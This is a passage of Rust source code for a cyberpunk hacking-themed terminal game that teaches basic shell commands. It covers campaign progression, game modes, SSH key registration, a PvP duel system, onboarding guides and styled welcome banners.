                            return Ok(("Run `campaign start` first.\n".to_owned(), 1, false));
                        }
                        if chapter > 12 {
                            return Ok((
                                "Campaign complete! Ghost Rail exposed. ZENITH destroyed. APEX terminated.\n"
                                    .to_owned(),
                                0,
                                false,
                            ));
                        }
                        // Simple advancement — increment step, overflow to next chapter
                        // Chapters 1-7: Ghost Rail arc | Chapters 8-12: Crystal Array arc
                        let steps_per_chapter: &[u8] = &[0, 5, 5, 5, 5, 3, 4, 3, 5, 5, 5, 4, 4];
                        let max_steps = steps_per_chapter
                            .get(chapter as usize)
                            .copied()
                            .unwrap_or(4);
                        if step + 1 >= max_steps {
                            let next_ch = chapter + 1;
                            self.app
                                .world
                                .set_campaign_progress(player_id, next_ch, 0)
                                .await?;
                            if next_ch == 8 {
                                // Transition from Ghost Rail to Crystal Array
                                let mut out = self.render_section_banner(
                                    "GHOST RAIL ARC COMPLETE — CRYSTAL ARRAY UNLOCKED",
                                );
                                out.push_str(
                                    "EVA: The Ghost Rail conspiracy has been fully exposed.\n",
                                );
                                out.push_str("Wren's confession, Argon's cover-up, The Reach's payment — all documented.\n\n");
                                out.push_str("But Wren's final message changes everything.\n");
                                out.push_str("Ghost Rail was a distraction. The real extraction happened in Crystal Array.\n\n");
                                out.push_str("WARNING: Crystal Array is significantly harder. NPCs are stronger.\n");
                                out.push_str("Shell challenges require advanced multi-tool pipelines, base64 decoding,\n");
                                out.push_str("hex analysis, and multi-file correlation.\n\n");
                                out.push_str("Run `campaign` to see Chapter 8 objectives.\n");
                                Ok((out, 0, false))
                            } else if next_ch > 12 {
                                let mut out = self
                                    .render_section_banner("CAMPAIGN COMPLETE — ALL ARCS FINISHED");
                                out.push_str(
                                    "EVA: APEX has been terminated. ZENITH's core is offline. The mirror is severed.\n\n",
                                );
                                out.push_str("You followed the evidence from a single ghost login in an auth log\n");
                                out.push_str("to a rogue AI in a hardened data vault. From Ghost Rail to Crystal Array.\n");
                                out.push_str("From Wren's betrayal to ZENITH's destruction.\n\n");
                                out.push_str("The city does not know what you did. But because of you, it has stopped watching.\n\n");
                                out.push_str("Thank you, operative. Truly.\n");
                                Ok((out, 0, false))
                            } else {
                                let title =
                                    campaign_titles.get(next_ch as usize).unwrap_or(&"Unknown");
                                let mut out = self.render_section_banner(&format!(
                                    "CAMPAIGN // CHAPTER {}: {}",
                                    next_ch,
                                    title.to_uppercase()
                                ));
                                out.push_str(&format!("EVA: Chapter {} begins.\n", next_ch));
                                out.push_str("Run `campaign` to see your new objectives.\n");
                                Ok((out, 0, false))
                            }
                        } else {
                            self.app
                                .world
                                .set_campaign_progress(player_id, chapter, step + 1)
                                .await?;
                            Ok((format!("Campaign advanced to Chapter {}, Step {}.\nRun `campaign` to see objectives.\n", chapter, step + 2), 0, false))
                        }
                    }
                    _ => {
                        // Show current objectives
                        if chapter == 0 {
                            return Ok((
                                "Campaign not started. Run `campaign start` to begin.\n".to_owned(),
                                0,
                                false,
                            ));
                        }
                        if chapter > 12 {
                            return Ok((
                                "Campaign complete! Run `history` to see the NetCity ledger.\n"
                                    .to_owned(),
                                0,
                                false,
                            ));
                        }
                        let title = campaign_titles.get(chapter as usize).unwrap_or(&"Unknown");
                        let mut out = self.render_section_banner(&format!(
                            "CAMPAIGN // CHAPTER {}: {}",
                            chapter,
                            title.to_uppercase()
                        ));
                        out.push_str(&format!("Step {}\n\n", step + 1));
                        match chapter {
                            1 => out.push_str("Objectives: Complete tutorial missions (nav-101 → pipe-101) and keys-vault.\n"),
                            2 => out.push_str("Objectives: Complete rivet-log, nix-signal, timestamp-gap, ghost-user, first-clue.\n"),
                            3 => out.push_str("Objectives: Complete access-pattern, purged-comms, key-rotation, kestrel-brief, ferro-lockdown.\n"),
                            4 => out.push_str("Objectives: Complete wren-profile, exfil-trace, reach-intercept, config-diff, corpsim-memo.\n"),
                            5 => out.push_str("Objectives: Hack Dusk (hack DSK), Ferro (hack FER), Argon (hack ARG).\n"),
                            6 => out.push_str("Objectives: Complete decrypt-wren, prove-corpsim, kestrel-verdict, final-report.\n"),
                            7 => out.push_str("Objectives: Hack Wren (hack WREN), complete wren-reply, crucible-offer.\n"),
                            // ── Crystal Array expansion chapters ──
                            8 => out.push_str("Objectives: Complete crystal-gate, zenith-log, mirror-detect, power-grid-map, vault-sat-13.\n"),
                            9 => out.push_str("Objectives: Complete volt-survey, quicksilver-trace, cipher-defection, spectre-sighting, obsidian-intercept.\n"),
                            10 => out.push_str("Objectives: Complete zenith-core, surveillance-net, population-index, behavioral-model, predictive-engine.\n"),
                            11 => out.push_str("Objectives: Complete spectre-dossier, wren-truth, zenith-mirror, apex-signal.\n"),
                            12 => out.push_str("Objectives: Complete shutdown-sequence, then hack Zenith (hack ZEN), Obsidian (hack OBS), and APEX (hack APX).\n"),
                            _ => out.push_str("Unknown chapter.\n"),
                        }
                        out.push_str("\nRun `campaign next` after completing each objective.\n");
                        Ok((out, 0, false))
                    }
                }
            }
            "mode" => {
                if args.is_empty() {
                    return Ok((
                        "Usage: mode <training|netcity|redline> [--no-flash]\n".to_owned(),
                        1,
                        false,
                    ));
                }
                let target = match args[0] {
                    "training" => Mode::Training,
                    "netcity" => Mode::NetCity,
                    "redline" => Mode::Redline,
                    _ => {
                        return Ok((
                            "Unknown mode. Use training|netcity|redline\n".to_owned(),
                            1,
                            false,
                        ));
                    }
                };

                let no_flash = args.contains(&"--no-flash");
                let old = self.mode.clone();
                self.flash_enabled = if no_flash { false } else { self.flash_enabled };

                if let Err(err) = self
                    .app
                    .world
                    .mode_switch(player_id, target.clone(), Some(self.flash_enabled))
                    .await
                {
                    return Ok((format!("{err}\n"), 1, false));
                }

                if target == Mode::Redline {
                    self.redline_until = Some(
                        Instant::now() + Duration::from_secs(self.app.cfg.redline.duration_seconds),
                    );
                } else {
                    self.redline_until = None;
                }

                self.mode = target.clone();
                let mut out = String::new();
                out.push_str(&mode_switch_banner(old, target.clone()));
                out.push_str(&self.render_mode_banner(target.clone()));
                out.push('\n');
                out.push_str(lore_message(target));
                out.push('\n');
                Ok((out, 0, false))
            }
            "keyvault" => {
                if args.first() == Some(&"register") {
                    let maybe_line = line.strip_prefix("keyvault register").unwrap_or("").trim();
                    if maybe_line.is_empty() {
                        self.pending_keyvault = true;
                        return Ok((
                            "Paste your full public key line now (ssh-ed25519 AAAA... comment):\n"
                                .to_owned(),
                            0,
                            false,
                        ));
                    }
                    match self.app.world.register_key(player_id, maybe_line).await {
                        Ok(fp) => Ok((format!("Key registered: {fp}\n"), 0, false)),
                        Err(err) => Ok((format!("Key registration failed: {err}\n"), 1, false)),
                    }
                } else {
                    Ok((
                        "Usage: keyvault register [ssh-public-key-line]\n".to_owned(),
                        1,
                        false,
                    ))
                }
            }
            "settings" => {
                if args.len() == 2 && args[0] == "flash" {
                    self.flash_enabled = args[1] != "off";
                    Ok((
                        format!(
                            "Flash effects {}\n",
                            if self.flash_enabled { "ON" } else { "OFF" }
                        ),
                        0,
                        false,
                    ))
                } else {
                    Ok(("Usage: settings flash <on|off>\n".to_owned(), 1, false))
                }
            }
            "status" => {
                let player = self
                    .app
                    .world
                    .get_player(player_id)
                    .await
                    .ok_or_else(|| anyhow!("unknown player"))?;
                let gate = self
                    .app
                    .world
                    .netcity_gate_reason(player_id, &self.offered_fingerprints)
                    .await?;
                let mut achievements = player.achievements.iter().cloned().collect::<Vec<_>>();
                achievements.sort();
                let ach = if achievements.is_empty() {
                    "none".to_owned()
                } else {
                    achievements.join(", ")
                };
                let gate_status = gate.clone().unwrap_or_else(|| "UNLOCKED".to_owned());
                let streak = player
                    .streak_day
                    .map(|d| d.to_string())
                    .unwrap_or("-".to_owned());
                let rep_pct = player.reputation.clamp(0, 100) as u8;
                let death_pct = if player.deaths >= 3 {
                    0
                } else {
                    (((3 - player.deaths) as f32 / 3.0) * 100.0).round() as u8
                };
                let gate_pct = if gate.is_none() { 100 } else { 20 };

                let mut out = self.render_section_banner("PLAYER STATUS");
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Alias",
                    &player.private_alias,
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Display",
                    &player.display_name,
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Tier/Mode",
                    &format!("{:?} / {:?}", player.tier, player.mode),
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Wallet",
                    &format!("{} Neon Chips", player.wallet),
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Reputation",
                    &format!(
                        "{} {}",
                        player.reputation,
                        progress_meter(self.mode.clone(), rep_pct, 14)
                    ),
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Survival",
                    &format!(
                        "{} deaths {}",
                        player.deaths,
                        progress_meter(self.mode.clone(), death_pct, 14)
                    ),
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "NetCity Gate",
                    &format!(
                        "{} {}",
                        gate_status,
                        progress_meter(self.mode.clone(), gate_pct, 14)
                    ),
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Daily Streak",
                    &format!("{} (last claim: {})", player.streak, streak),
                ));
                out.push_str(&key_value_line(self.mode.clone(), "Achievements", &ach));

                Ok((out, 0, false))
            }
            "events" => {
                let feed = self
                    .app
                    .world
                    .world_events_snapshot(chrono::Utc::now())
                    .await;
                if feed.is_empty() {
                    return Ok(("No upcoming world events.\n".to_owned(), 0, false));
                }
                let now = chrono::Utc::now();
                let mut out = self.render_section_banner("WORLD EVENTS");
                for event in feed {
                    let status = if event.active {
                        format!(
                            "ACTIVE (ends in {}m)",
                            (event.ends_at - now).num_minutes().max(0)
                        )
                    } else {
                        format!(
                            "UPCOMING (starts in {}m)",
                            (event.starts_at - now).num_minutes().max(0)
                        )
                    };
                    out.push_str(&format!(
                        "- {} :: {} :: {}\n",
                        event.sector, event.title, status
                    ));
                }
                Ok((out, 0, false))
            }
            "scripts" => {
                if args.first() == Some(&"market") || args.is_empty() {
                    let mut out = self.render_section_banner("SCRIPT MARKET");
                    for entry in script_market() {
                        out.push_str(&format!(
                            "- {:<12} {}{}\n",
                            entry.name, entry.description, RESET
                        ));
                    }
                    out.push_str("Run with: scripts run <name>\n");
                    return Ok((out, 0, false));
                }

                if args.first() != Some(&"run") {
                    return Ok((
                        "Usage: scripts market | scripts run <name>\n".to_owned(),
                        1,
                        false,
                    ));
                }

                let Some(name) = args.get(1).copied() else {
                    return Ok(("Usage: scripts run <name>\n".to_owned(), 1, false));
                };
                let Some(entry) = script_market().iter().find(|entry| entry.name == name) else {
                    let names = script_market()
                        .iter()
                        .map(|entry| entry.name)
                        .collect::<Vec<_>>()
                        .join(", ");
                    return Ok((format!("Unknown script. Available: {names}\n"), 1, false));
                };

                if let Some(until) = self.script_cooldown_until {
                    let now = Instant::now();
                    if now < until {
                        let remain = until.duration_since(now).as_secs().max(1);
                        return Ok((
                            format!("Script sandbox cooling down. Retry in {remain}s\n"),
                            1,
                            false,
                        ));
                    }
                }

                let log_content = self
                    .shell_state
                    .as_ref()
                    .and_then(|shell| {
                        shell
                            .vfs
                            .read_file(&shell.cwd, "/logs/neon-gateway.log")
                            .ok()
                    })
                    .unwrap_or_default();
                let mut virtual_files = BTreeMap::new();
                virtual_files.insert("/logs/neon-gateway.log".to_owned(), log_content);
                let script_out = self
                    .app
                    .script
                    .run(
                        entry.source,
                        ScriptContext {
                            visible_nodes: vec![
                                "neon-bazaar-gw".to_owned(),
                                "ghost-rail".to_owned(),
                                "vault-sat-9".to_owned(),
                            ],
                            virtual_files,
                        },
                    )
                    .await
                    .map_err(|e| anyhow!("script execution failed: {e}"))?;

                self.script_cooldown_until = Some(Instant::now() + Duration::from_secs(8));
                let mut out = format!("Script {} complete.\n", entry.name);
                if script_out.output.trim().is_empty() {
                    out.push_str("(no output)\n");
                } else {
                    out.push_str(&script_out.output);
                    if !out.ends_with('\n') {
                        out.push('\n');
                    }
                }
                Ok((out, 0, false))
            }
            "daily" => {
                let reward = self
                    .app
                    .world
                    .claim_daily_reward(player_id, chrono::Utc::now())
                    .await?;
                Ok((format!("Daily reward: +{reward} Neon Chips\n"), 0, false))
            }
            "tier" => {
                let Some(raw) = args.first() else {
                    return Ok(("Usage: tier <noob|gud|hardcore>\n".to_owned(), 1, false));
                };
                let Some(tier) = ExperienceTier::parse(raw) else {
                    return Ok((
                        "Invalid tier. Use: noob, gud, hardcore\n".to_owned(),
                        1,
                        false,
                    ));
                };
                self.app.world.set_tier(player_id, tier).await?;
                Ok((
                    "Tier set. Available tiers: Noob, Gud, Hardcore\n".to_owned(),
                    0,
                    false,
                ))
            }
            "pvp" => {
                if args.is_empty() {
                    return Ok((
                        "Usage: pvp roster | pvp challenge <username> | pvp attack|defend|script <name>\n"
                            .to_owned(),
                        1,
                        false,
                    ));
                }
                match args[0] {
                    "roster" => {
                        let roster = self.app.world.roster().await;
                        Ok((format!("{}\n", roster.join("\n")), 0, false))
                    }
                    "challenge" => {
                        let Some(target_name) = args.get(1) else {
                            return Ok(("Usage: pvp challenge <username>\n".to_owned(), 1, false));
                        };
                        let Some(target) =
                            self.app.world.resolve_player_by_username(target_name).await
                        else {
                            return Ok(("Target not found\n".to_owned(), 1, false));
                        };
                        let duel = self.app.world.start_duel(player_id, target.id).await?;
                        self.current_duel = Some(duel.duel_id);
                        Ok((
                            format!("Duel started vs {}\n", target.display_name),
                            0,
                            false,
                        ))
                    }
                    "attack" | "defend" | "script" => {
                        let Some(duel_id) = self.current_duel else {
                            return Ok((
                                "No active duel. Start with: pvp challenge <username>\n".to_owned(),
                                1,
                                false,
                            ));
                        };
                        let action = match args[0] {
                            "attack" => CombatAction::Attack,
                            "defend" => CombatAction::Defend,
                            "script" => {
                                let name = args.get(1).copied().unwrap_or("quickhack").to_owned();
                                CombatAction::Script(name)
                            }
                            _ => unreachable!(),
                        };
                        let outcome = self
                            .app
                            .world
                            .duel_action(duel_id, player_id, action)
                            .await?;
                        if outcome.ended {
                            self.current_duel = None;
                        }
                        Ok((format!("{}\n", outcome.narrative), 0, false))
                    }
                    _ => Ok(("Unknown pvp command\n".to_owned(), 1, false)),
                }
            }
            "relay" => {
                let body = line.strip_prefix("relay").unwrap_or("").trim();
                if body.is_empty() {
                    return Ok(("Usage: relay <message>\n".to_owned(), 1, false));
                }
                if !self
                    .app
                    .world
                    .player_has_completed_hidden_mission(player_id)
                    .await
                {
                    return Ok((
                        "Relay locked. Discover deeper city layers first.\n".to_owned(),
                        1,
                        false,
                    ));
                }
                self.app
                    .world
                    .relay_to_admin_via_telegram(player_id, body)
                    .await?;
                Ok((
                    "Message relayed via secure bot channel.\n".to_owned(),
                    0,
                    false,
                ))
            }
            _ => Ok((
                "Unknown game command. Run help or guide.\n".to_owned(),
                127,
                false,
            )),
        }
    }

    fn quickstart_guide(&self) -> String {
        let mut out = self.render_section_banner("FIRST SESSION PLAYBOOK");
        out.push_str(
            "1. tutorial start        (guided 6-step walkthrough — new to shells? start here)\n",
        );
        out.push_str(
            "2. tutorial next         (advance through each step after running commands)\n",
        );
        out.push_str("3. guide shell           (or cat /missions/rookie-ops.txt)\n");
        out.push_str("4. briefing\n");
        out.push_str("5. missions              (tutorial-track missions give 5 rep each)\n");
        out.push_str("6. accept keys-vault\n");
        out.push_str("6. keyvault register\n");
        out.push_str("7. submit keys-vault\n");
        out.push_str("8. briefing pipes-101   (or log-hunt|dedupe-city)\n");
        out.push_str("9. accept pipes-101     (or the starter mission you want)\n");
        out.push_str("10. submit pipes-101    (or the starter mission you accepted)\n");
        out.push_str("11. gate\n");
        out.push_str("12. mode netcity\n");
        out.push('\n');
        out.push_str("If bash feels rusty\n");
        out.push_str("  cat /missions/rookie-ops.txt\n");
        out.push_str("  cat /data/lore/field-manual.txt\n");
        out.push('\n');
        out.push_str("Daily loop after unlock\n");
        out.push_str(
            "  daily -> events -> auction list -> scripts market -> pvp roster -> leaderboard\n",
        );
        out.push('\n');
        out.push_str("Use `guide full` for a deeper walkthrough of progression systems.\n");
        out
    }

    fn full_gameplay_guide(&self) -> String {
        let mut out = self.render_section_banner("GAMEPLAY GUIDE // FULL");
        out.push_str("Onboarding and unlock flow\n");
        out.push_str("  - Start interactive tutorial: tutorial start (6 guided steps)\n");
        out.push_str("  - Advance tutorial steps: tutorial next (after running each command)\n");
        out.push_str("  - Try tutorial missions: nav-101, read-101, echo-101, grep-101, pipe-101 (5 rep each)\n");
        out.push_str("  - Get shell basics: guide shell\n");
        out.push_str("  - Read story + hints: briefing\n");
        out.push_str("  - Read shell cheat sheet: cat /missions/rookie-ops.txt\n");
        out.push_str("  - Inspect board: missions\n");
        out.push_str("  - Accept required: accept keys-vault\n");
        out.push_str("  - Register key: keyvault register\n");
        out.push_str("  - Complete mission: submit keys-vault\n");
        out.push_str(
            "  - Complete one starter mission: pipes-101|finder|redirect-lab|log-hunt|dedupe-city\n",
        );
        out.push_str("  - Get mission-specific help: briefing <mission-code>\n");
        out.push_str("  - Verify requirements: gate\n");
        out.push_str("  - Enter multiplayer: mode netcity\n");
        out.push('\n');
        out.push_str("Bash ramp for new players\n");
        out.push_str("  - Read files with cat, head, tail, or less\n");
        out.push_str("  - Use grep to filter lines by a word or pattern\n");
        out.push_str("  - Use | to pass output to the next command\n");
        out.push_str("  - Use > to save output, and >> to append to a file\n");
        out.push_str("  - If a pipeline feels too long, run each step separately first\n");
        out.push('\n');
        out.push_str("Advanced missions (post-NetCity)\n");
        out.push_str("  - awk-patrol  : Extract fields from /data/node-registry.csv with awk\n");
        out.push_str("  - chain-ops   : Use && and || to chain conditional commands\n");
        out.push_str("  - sediment    : Edit /logs/access.log streams with sed\n");
        out.push_str("  Each awards 20 reputation (vs 10 for starters).\n");
        out.push('\n');
        out.push_str("Story frame\n");
        out.push_str("  - Ghost Rail suffered the first blackout.\n");
        out.push_str("  - vault-sat-9 dropped offline right after GLASS-AXON-13 surfaced.\n");
        out.push_str("  - CorpSim is training replacements while the city argues about sabotage vs key theft.\n");
        out.push('\n');
        out.push_str("Progression systems\n");
        out.push_str("  - Status and progression: status, missions, gate, events\n");
        out.push_str("  - Economy: shop list, auction list|sell|bid|buyout\n");
        out.push_str("  - Scripts: scripts market, scripts run <name>\n");
        out.push_str("  - PvP: pvp roster, pvp challenge <user>, pvp attack|defend|script\n");
        out.push_str("  - Daily value: daily, leaderboard [N]\n");
        out.push('\n');
        out.push_str("Difficulty and risk\n");
        out.push_str("  - Set tier: tier noob|gud|hardcore\n");
        out.push_str("  - Hardcore rule: 3 deaths permanently zeroes account\n");
        out.push_str("  - REDLINE mode: mode redline    (disable flash with settings flash off)\n");
        out.push('\n');
        out.push_str("Security rule\n");
        out.push_str("  - Any breakout/probing attempt triggers permanent zero + disconnect.\n");
        out
    }

    fn shell_survival_guide(&self) -> String {
        let mut out = self.render_section_banner("SHELL SURVIVAL GUIDE");
        out.push_str("Never used a terminal before?\n");
        out.push_str("  - Run `tutorial start` for a hands-on guided walkthrough (6 steps).\n");
        out.push_str(
            "  - Check the TUTORIAL track on the mission board for 5 beginner missions.\n",
        );
        out.push('\n');
        out.push_str("Read-only first steps\n");
        out.push_str("  - pwd                      # show your current path\n");
        out.push_str("  - ls /logs                 # inspect files before opening them\n");
        out.push_str("  - cat /missions/story-so-far.txt\n");
        out.push('\n');
        out.push_str("Filter and count\n");
        out.push_str("  - grep token /logs/neon-gateway.log\n");
        out.push_str("  - cat /logs/neon-gateway.log | grep token | wc -l\n");
        out.push('\n');
        out.push_str("Save output for later\n");
        out.push_str("  - grep WARN /logs/neon-gateway.log > /tmp/warnings.txt\n");
        out.push_str("  - cat /tmp/warnings.txt\n");
        out.push('\n');
        out.push_str("Reuse values\n");
        out.push_str("  - TARGET=vault-sat-9\n");
        out.push_str("  - echo $TARGET\n");
        out.push_str("  - echo $?                  # last exit code, 0 means success\n");
        out.push('\n');
        out.push_str("When you get stuck\n");
        out.push_str("  - Run one command at a time before building a pipeline.\n");
        out.push_str("  - Read /missions/rookie-ops.txt and /data/lore/field-manual.txt.\n");
        out.push_str(
            "  - Use briefing <mission-code> to get a mission-specific starter command.\n",
        );
        out
    }

    fn story_briefing(&self) -> String {
        let mut out = self.render_section_banner("OPERATIVE BRIEFING");
        out.push_str("Situation\n");
        out.push_str(
            "  Ghost Rail lost sync three nights ago. Since then, vault-sat-9 has stayed dark and a beacon named GLASS-AXON-13 keeps showing up in gateway logs.\n",
        );
        out.push_str(
            "  CorpSim calls this onboarding, but every mission file in this sim is built from live cleanup traffic.\n",
        );
        out.push('\n');
        out.push_str("First moves\n");
        out.push_str(
            "  - tutorial start          # guided 6-step walkthrough (best for beginners)\n",
        );
        out.push_str("  - tutorial next           # advance after running each command\n");
        out.push_str("  - guide shell\n");
        out.push_str("  - cat /missions/rookie-ops.txt\n");
        out.push_str(
            "  - missions                # tutorial-track missions (nav-101, read-101, etc.)\n",
        );
        out.push_str("  - briefing pipes-101\n");
        out.push_str("  - accept keys-vault\n");
        out.push('\n');
        out.push_str("Story files\n");
        out.push_str("  - /missions/story-so-far.txt\n");
        out.push_str("  - /data/lore/ghost-rail-dossier.txt\n");
        out.push_str("  - /data/lore/netcity-fragment.txt\n");
        out.push('\n');
        out.push_str("Mission help\n");
        out.push_str("  Use: briefing <mission-code>\n");
        out.push_str("  Recommended starter order: pipes-101 -> log-hunt -> dedupe-city\n");
        out
    }

    fn render_mission_briefing(&self, mission: &world::MissionDefinition) -> String {
        let mut out = self.render_section_banner(&format!("MISSION BRIEF // {}", mission.code));
        out.push_str(&format!("{}\n", mission.title));
        out.push('\n');
        out.push_str("Why it matters\n");
        out.push_str(&format!("  {}\n", mission.story_beat));
        out.push('\n');
        out.push_str("What you practice\n");
        out.push_str(&format!("  {}\n", mission.summary));
        out.push('\n');
        out.push_str("First command to try\n");
        out.push_str(&format!("  {}\n", mission.suggested_command));
        out.push('\n');
        out.push_str("Hint\n");
        out.push_str(&format!("  {}\n", mission.hint));
        out
    }

    fn welcome_banner(&self) -> String {
        if self.is_admin {
            return self.admin_welcome_banner();
        }
        self.player_welcome_banner()
    }

    /// Red cyberpunk admin interface for Snake.
    fn admin_welcome_banner(&self) -> String {
        let mut out = String::new();
        out.push_str("\x1b[31m"); // Red
        out.push_str("╔══════════════════════════════════════════════════════════════╗\n");
        out.push_str("║                                                              ║\n");
        out.push_str("║   ███████╗███╗   ██╗ █████╗ ██╗  ██╗███████╗               ║\n");
        out.push_str("║   ██╔════╝████╗  ██║██╔══██╗██║ ██╔╝██╔════╝               ║\n");
        out.push_str("║   ███████╗██╔██╗ ██║███████║█████╔╝ █████╗                 ║\n");
        out.push_str("║   ╚════██║██║╚██╗██║██╔══██║██╔═██╗ ██╔══╝                 ║\n");
        out.push_str("║   ███████║██║ ╚████║██║  ██║██║  ██╗███████╗               ║\n");
        out.push_str("║   ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝               ║\n");
        out.push_str("║                                                              ║\n");
        out.push_str(
            "║   \x1b[1;31mADMINISTRATOR CONTROL INTERFACE\x1b[0;31m                        ║\n",
        );
        out.push_str("║   CLEARANCE: ULTRA-BLACK // THE CABAL                        ║\n");
        out.push_str("║                                                              ║\n");
        out.push_str("╠══════════════════════════════════════════════════════════════╣\n");
        out.push_str("║                                                              ║\n");
        out.push_str(
            "║   \x1b[1;33mSYSTEMS\x1b[0;31m                                                  ║\n",
        );
        out.push_str("║   admin players          List all connected players          ║\n");
        out.push_str("║   admin broadcast <msg>  Send system-wide message            ║\n");
        out.push_str("║   admin ban <user>       Zero an account permanently         ║\n");
        out.push_str("║   admin unban <user>     Restore a zeroed account            ║\n");
        out.push_str("║   admin grant <user> <n> Grant neon chips to player          ║\n");
        out.push_str("║   admin npc list         List all NPC states + generations   ║\n");
        out.push_str("║   admin npc reset <cs>   Reset NPC to Gen I                 ║\n");
        out.push_str("║   admin world stats      Full world statistics               ║\n");
        out.push_str("║                                                              ║\n");
        out.push_str(
            "║   \x1b[1;33mGAME COMMANDS\x1b[0;31m                                             ║\n",
        );
        out.push_str("║   All standard game commands are also available.             ║\n");
        out.push_str("║   You are immune to bans, zeroing, and combat death.         ║\n");
        out.push_str("║                                                              ║\n");
        out.push_str("╚══════════════════════════════════════════════════════════════╝\n");
        out.push_str("\x1b[0m"); // Reset
        if self.pending_admin_passphrase {
            out.push_str(
                "\x1b[1;33mAdmin bootstrap: enter passphrase to generate one-time key blob.\x1b[0m\n",
            );
        }
        out
    }

    /// Cyberpunk neon welcome banner — Matrix x Cyberpunk 2077 aesthetic.
    fn player_welcome_banner(&self) -> String {
        let cols = self.pty_columns.max(20) as usize;
        let uc = self.supports_unicode;
        let theme = Theme::for_mode(self.mode.clone());
        let mut out = String::new();

        // 1. Splash logo
        out.push_str(&splash_logo(self.mode.clone(), cols, uc));
        out.push('\n');

        // 2. Boot sequence
        out.push_str(&self.build_boot_sequence());
        out.push('\n');

        // 3. Scanline transition
        out.push_str(&scanline(self.mode.clone(), cols, uc));

        // 4. Mode banner (existing — already looks good)
        out.push_str(&self.render_mode_banner(self.mode.clone()));
        out.push('\n');

        // 5. Lore message (dimmed, atmospheric)
        out.push_str(&format!(
            "{dim}{}{RESET}\n\n",
            lore_message(self.mode.clone()),
            dim = theme.dim,
        ));

        // 6. Glitch divider transition to HUD
        out.push_str(&glitch_divider(self.mode.clone(), cols, uc));

        // 7. Player HUD panel
        out.push_str(&self.build_player_hud());
        out.push('\n');

        // 8. Contextual quick start
        out.push_str(&neon_header(self.mode.clone(), "QUICK START", cols, uc));
        out.push_str(&self.contextual_hint());
        out.push('\n');

        // 9. Security warning (compact, dimmed)
        out.push_str(&format!(
            "{dim}Breakout/probing attempts -> permanent account zero + disconnect.{RESET}\n",
            dim = theme.dim,
        ));

        out
    }

    /// Personalized system boot sequence using real player data.
    fn build_boot_sequence(&self) -> String {
        let cols = self.pty_columns.max(20) as usize;
        let m = self.mode.clone();
        let mut out = String::new();

        out.push_str(&boot_line(
            m.clone(),
            "NEURAL LINK",
            "connected",
            BootStatus::Ok,
            cols,
        ));

        // Identity — use player's actual username
        let identity_msg = if let Some(ref p) = self.profile {
            format!("{} verified", p.username)
        } else {
            "guest (unregistered)".to_string()
        };
        out.push_str(&boot_line(
            m.clone(),
            "IDENTITY",
            &identity_msg,
            BootStatus::Ok,
            cols,
        ));

        out.push_str(&boot_line(
            m.clone(),
            "ENCRYPTION",
            "AES-256-GCM active",
            BootStatus::Ok,
            cols,
        ));

        // Fingerprint
        let fp_msg = self
            .offered_fingerprints
            .first()
            .map(|fp| {
                let short: String = fp.chars().take(20).collect();
                format!("{short}...")
            })
            .unwrap_or_else(|| "unregistered".to_string());
        let fp_status = if self.offered_fingerprints.is_empty() {
            BootStatus::Warn
        } else {
            BootStatus::Ok
        };
        out.push_str(&boot_line(
            m.clone(),
            "KEY SIGNATURE",
            &fp_msg,
            fp_status,
            cols,
        ));

        // Node
        let node = self
            .shell_state
            .as_ref()
            .map(|s| s.node.as_str())
            .unwrap_or("corp-sim-01");
        out.push_str(&boot_line(
            m.clone(),
            "NODE",
            &format!("{node} online"),
            BootStatus::Ok,
            cols,
        ));

        // Vault-sat-9 — degraded in Training, online in NetCity
        let (vault_msg, vault_status) = match self.mode {
            Mode::Training => ("degraded", BootStatus::Warn),
            Mode::NetCity => ("online", BootStatus::Ok),
            Mode::Redline => ("CRITICAL", BootStatus::Fail),
        };
        out.push_str(&boot_line(
            m.clone(),
            "VAULT-SAT-9",
            vault_msg,
            vault_status,
            cols,
        ));

        out.push_str(&boot_line(
            m.clone(),
            "GHOST RAIL",
            "monitoring",
            BootStatus::Loading,
            cols,
        ));

        // Mission DB
        let mission_count = self
            .profile
            .as_ref()
            .map(|p| p.completed_missions.len())
            .unwrap_or(0);
        out.push_str(&boot_line(
            m.clone(),
            "MISSION DB",
            &format!("{mission_count} records loaded"),
            BootStatus::Ok,
            cols,
        ));

        // Wallet
        let wallet = self.profile.as_ref().map(|p| p.wallet).unwrap_or(0);
        out.push_str(&boot_line(
            m.clone(),
            "WALLET SYNC",
            &format!("{wallet} Neon Chips"),
            BootStatus::Ok,
            cols,
        ));

        // Combat subsystem
        let stance = self
            .profile
            .as_ref()
            .map(|p| match p.combat_stance {
                CombatStance::Pve => "PvE stance active",
                CombatStance::Pvp => "PvP stance active",
            })
            .unwrap_or("PvE stance active");
        out.push_str(&boot_line(
            m.clone(),
            "COMBAT SYS",
            stance,
            BootStatus::Ok,
            cols,
        ));

        // Mail (only if unread)
        if let Some(ref p) = self.profile {
            let unread = p.mailbox.iter().filter(|m| !m.read).count();
            if unread > 0 {
                out.push_str(&boot_line(
                    m.clone(),
                    "MAIL QUEUE",
                    &format!("{unread} unread transmission(s)"),
                    BootStatus::Warn,
                    cols,
                ));
            }
        }

        // Final: system ready
        let tier_label = self
            .profile
            .as_ref()
            .map(|p| match p.tier {
                ExperienceTier::Noob => "NOOB",
                ExperienceTier::Gud => "GUD",
                ExperienceTier::Hardcore => "HARDCORE",
            })
            .unwrap_or("NOOB");
        out.push_str(&boot_line(
            m,
            "SYSTEM READY",
            &format!("{tier_label} clearance granted"),
            BootStatus::Ok,
            cols,
        ));

        out
    }

    /// Cyberpunk HUD panel showing player stats and progress.
    /// Every body line is padded to exactly `inner_width` visible characters
    /// so the right border of the panel aligns perfectly.
    fn build_player_hud(&self) -> String {
        let cols = self.pty_columns.max(20) as usize;
        let uc = self.supports_unicode;
        let m = self.mode.clone();
        // inner_width must match what titled_panel uses.
        let inner_width = cols.saturating_sub(4).clamp(20, 76);

        let (alias, tier, wallet, streak, mode_label, rep, stance_str, deaths) =
            if let Some(ref p) = self.profile {
                (
                    p.private_alias.clone(),
                    match p.tier {
                        ExperienceTier::Noob => "Noob",
